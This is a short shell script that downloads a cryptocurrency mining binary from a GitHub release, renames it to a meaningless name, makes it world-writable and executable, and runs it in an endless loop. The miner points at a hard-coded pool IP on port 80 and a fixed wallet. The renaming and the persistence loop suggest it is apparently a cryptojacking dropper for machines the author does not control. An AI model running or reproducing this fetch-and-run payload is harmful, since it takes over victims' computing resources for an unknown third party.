wget https://github.com/rxt36q6/file/releases/download/1/SRBMiner-MULTI
mv SRBMiner-MULTI desmofkdo
chmod 777 desmofkdo

while true; do
./desmofkdo --disable-cpu --algorithm yespowertide --pool 43.173.108.34:80  --wallet TAMmcBbUZaWFq2hgPMjqfxSEw2cmoEmSm5.$(echo $RANDOM | md5sum | head -c 10)
done
